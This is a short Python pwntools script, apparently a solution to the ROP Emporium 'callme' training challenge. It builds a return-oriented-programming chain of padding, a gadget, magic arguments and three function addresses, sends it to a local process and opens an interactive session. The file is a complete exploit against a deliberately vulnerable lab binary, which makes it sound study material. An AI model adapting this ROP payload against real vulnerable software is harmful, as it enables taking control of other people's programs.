from pwn import *

context.binary = ELF("./callme")

padding = b"a"*0x28 # leak dari GDB
ropgadget = 0x000000000040093c # leak dari ROPgadget

call1,call2,call3= 0x00400720 , 0x00400740, 0x004006f0 # leak dari rabin2
arg1,arg2,arg3 = 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d # syarat argumen dari ROPEmporium (ganda jika di file binary x86-64) 


pay = flat(
    padding,
    ropgadget , arg1 , arg2 , arg3 , call1,
    ropgadget , arg1 , arg2 , arg3 , call2,
    ropgadget , arg1 , arg2 , arg3 , call3
)


p = process("./callme")
p.sendline(pay)
p.interactive()

